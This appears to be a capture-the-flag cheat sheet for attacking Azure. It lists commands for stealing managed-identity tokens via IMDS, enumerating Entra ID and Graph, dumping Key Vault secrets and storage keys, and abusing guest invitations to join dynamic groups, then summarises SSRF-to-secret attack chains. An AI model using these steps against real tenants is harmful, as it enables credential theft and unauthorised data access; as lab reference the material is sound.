# Azure

## Fingerprint

```text
Metadata: true
169.254.169.254/metadata/instance
*.blob.core.windows.net
*.vault.azure.net
*.azurewebsites.net
*.azurecr.io
AZURE_CLIENT_ID
AZURE_CLIENT_SECRET
AZURE_TENANT_ID
```

## Metadata / Managed Identity

Instance metadata:

```bash
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
```

Managed identity token:

```bash
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

Common resources:

```text
https://management.azure.com/
https://storage.azure.com/
https://vault.azure.net
https://graph.microsoft.com/
https://database.windows.net/
```

Token response contains `access_token`, `expires_on`, `resource`, `token_type`, `client_id`.

Without `Metadata: true`, Azure usually returns `400`.

## Auth

```bash
az account show
az account list
az login
az login --service-principal -u CLIENT_ID -p CLIENT_SECRET --tenant TENANT_ID
az ad signed-in-user show
az ad sp list --all
az role assignment list --all
```

Environment variables used by SDKs:

```text
AZURE_CLIENT_ID
AZURE_CLIENT_SECRET
AZURE_TENANT_ID
AZURE_SUBSCRIPTION_ID
```

## Entra ID / OAuth

A service principal consented in the target tenant is enough to start with Graph, even without a subscription:

```bash
az login --service-principal \
  --username "$AZURE_CLIENT_ID" \
  --password "$AZURE_CLIENT_SECRET" \
  --tenant TARGET_TENANT_ID \
  --allow-no-subscriptions

TOKEN=$(az account get-access-token \
  --resource https://graph.microsoft.com \
  --query accessToken -o tsv)
export TOKEN
```

Decode the token to see the application and roles:

```bash
python - <<'PY'
import base64, json, os
p = os.environ["TOKEN"].split(".")[1]
p += "=" * (-len(p) % 4)
print(json.dumps(json.loads(base64.urlsafe_b64decode(p)), indent=2))
PY
```

Interesting Graph permissions:

```text
Directory.Read.All
Group.Read.All
User.Invite.All
User.Read.All
Application.Read.All
RoleManagement.Read.Directory
```

Enumerate groups and look for dynamic membership:

```bash
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/groups" | jq

curl -s -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/groups/GROUP_ID" \
  | jq '{displayName, groupTypes, membershipRule, membershipRuleProcessingState}'
```

A rule such as this turns a guest invitation into group membership:

```text
(user.displayName -startsWith "CTF") and (user.userType -eq "Guest")
```

Invite the guest:

```bash
curl -s -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  "https://graph.microsoft.com/v1.0/invitations" \
  -d '{
    "invitedUserEmailAddress": "ctf-guest@example.net",
    "inviteRedirectUrl": "https://portal.azure.com",
    "invitedUserDisplayName": "CTF Guest"
  }' | jq
```

`invitedUserDisplayName` is the documented Graph property; some challenge apps also accept `displayName`. The dynamic group rule matches the guest's display name, so verify it after redemption:

Redeem the invitation, then switch identity:

```bash
az logout
az login --tenant TARGET_TENANT_ID --use-device-code
```

Check the MyApps portal for applications granted to the group:

```text
https://myapps.microsoft.com?tenantid=TARGET_TENANT_ID
```

If the app exposes a storage account, download with the logged-in identity:

```bash
az storage blob download \
  --account-name ACCOUNT \
  --container-name CONTAINER \
  --name BLOB \
  --file out.bin \
  --auth-mode login
```

OAuth consent paths to check:

```text
/adminconsent?client_id=CLIENT_ID&scope=https://graph.microsoft.com/.default
/oauth2/v2.0/authorize?client_id=...&scope=...
```

An app consented by an administrator can receive tenant-wide application permissions. Look for `appRoleAssignments`, service principals, and enterprise applications, not only user consent.

## Resource Enumeration

```bash
az resource list
az group list
az vm list
az vm list-ip-addresses
az webapp list
az functionapp list
az aks list
az acr list
az keyvault list
az storage account list
```

## Storage

```bash
az storage account list
az storage container list --account-name ACCOUNT
az storage blob list --account-name ACCOUNT --container-name CONTAINER
az storage blob download --account-name ACCOUNT --container-name CONTAINER \
  --name BLOB --file out.bin
az storage account keys list --account-name ACCOUNT
```

SAS token:

```bash
az storage container generate-sas \
  --account-name ACCOUNT \
  --name CONTAINER \
  --permissions rl \
  --expiry 2030-01-01
```

Public blob:

```bash
curl -s "https://ACCOUNT.blob.core.windows.net/CONTAINER/BLOB"
curl -s "https://ACCOUNT.blob.core.windows.net/CONTAINER?restype=container&comp=list"
```

## Key Vault

```bash
az keyvault list
az keyvault secret list --vault-name VAULT
az keyvault secret show --vault-name VAULT --name SECRET
az keyvault key list --vault-name VAULT
az keyvault certificate list --vault-name VAULT
```

Access requires either a vault access policy or Azure RBAC role such as `Key Vault Secrets User`.

## App Service / Functions

```bash
az webapp config appsettings list --name APP --resource-group RG
az webapp deployment list-publishing-credentials --name APP --resource-group RG
az functionapp config appsettings list --name APP --resource-group RG
```

Kudu:

```text
https://APP.scm.azurewebsites.net/
https://APP.scm.azurewebsites.net/api/settings
https://APP.scm.azurewebsites.net/api/vfs/site/wwwroot/
```

## AKS

```bash
az aks list
az aks get-credentials --resource-group RG --name CLUSTER
kubectl get pods -A
kubectl get secrets -A
```

AKS can use a managed identity or workload identity. From a pod, the IMDS endpoint may expose the node or workload identity token.

## ARM / Deployment

```bash
az deployment group list --resource-group RG
az deployment group show --resource-group RG --name DEPLOYMENT
az deployment group create --resource-group RG --template-file main.json
```

Look for deployment parameters and outputs containing secrets.

## CTF Chains

```text
SSRF -> Azure IMDS -> managed identity token -> ARM / Storage / Key Vault
Leaked service principal -> az login -> subscription enumeration
Public blob container -> list -> download flag
App Service env -> storage key -> blob
AKS pod -> managed identity -> Key Vault
Consented OAuth app -> Graph Group.Read.All -> dynamic group rule -> User.Invite.All -> guest -> MyApps -> blob
Service principal in target tenant -> Graph roles -> invite guest -> group membership -> storage
```

## References

* [Azure IMDS documentation](https://learn.microsoft.com/azure/virtual-machines/instance-metadata-service)
* [Azure managed identities](https://learn.microsoft.com/entra/identity/managed-identities-azure-resources/overview)
* [Azure Storage documentation](https://learn.microsoft.com/azure/storage/)
* [HackTricks Azure](https://book.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html)
